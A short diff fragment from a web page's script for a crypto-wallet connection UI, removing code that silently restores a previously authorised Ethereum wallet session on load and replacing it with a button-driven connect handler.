-    renderPackages(); initEIP6963();
-    
-    setTimeout(async () => {
-      if (window.ethereum) {
-        try {
-          const accs = await window.ethereum.request({ method: "eth_accounts" });
-          if (accs?.length > 0) {
-            activeProvider = window.ethereum; connectedAccount = accs[0]; bindEvents(activeProvider);
-            btnConnect.hidden = true; btnDisconnect.hidden = false; addrPill.hidden = false;
-            addrPill.textContent = shortAddr(connectedAccount);
-            refreshNetwork(); log("[Auto] 探测到已授权钱包，静默连接成功");
-          }
-        } catch(e){}
-      }
-    }, 500);
+    connBtn.onclick = connect;
+    render();
   </script>
 </body>
 </html>
